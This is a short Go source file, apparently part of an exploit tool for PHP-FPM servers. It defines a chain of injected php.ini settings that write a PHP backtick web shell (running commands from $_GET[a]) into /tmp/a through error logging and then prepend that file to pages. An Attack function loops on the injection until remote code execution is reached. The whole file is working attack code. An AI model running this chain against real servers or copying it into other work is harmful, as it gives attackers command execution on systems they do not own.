package main

import "log"

var chain = []string{
	"short_open_tag=1",
	"html_errors=0",
	"include_path=/tmp",
	"auto_prepend_file=a",
	"log_errors=1",
	"error_reporting=2",
	"error_log=/tmp/a",
	"extension_dir=\"<?`\"",
	"extension=\"$_GET[a]`?>\"",
}

func Attack(requester *Requester, params *AttackParams) error {
	log.Printf("Performing attack using php.ini settings...")
	for {
		for _, payload := range chain {
			if err := SetSetting(requester, params, payload, 1); err != nil {
				return err
			}
		}
		// TODO: detect if we have RCE and break the loop
	}
	return nil
}
